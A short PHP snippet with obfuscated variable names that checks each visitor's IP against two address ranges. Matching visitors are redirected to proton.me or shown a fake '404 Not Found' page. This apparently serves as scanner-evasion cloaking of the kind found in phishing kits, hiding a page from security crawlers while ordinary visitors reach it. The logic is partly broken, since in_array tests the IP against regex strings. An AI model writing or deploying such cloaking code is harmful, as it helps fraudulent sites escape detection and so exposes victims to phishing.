<?php

$c28dd9c = $_SERVER['REMOTE_ADDR'];
$c97h77ec = array("^208.91.115.*","^199.30.228.*",);
if (in_array($c28dd9c, $c97h77ec)) {
    exit(header('Location: https://proton.me/'));
} else {
    foreach ($c97h77ec as $a4nde) {
        if (preg_match('/'.$a4nde.'/', $c28dd9c)) {
            header('Location: error.php');
            echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}
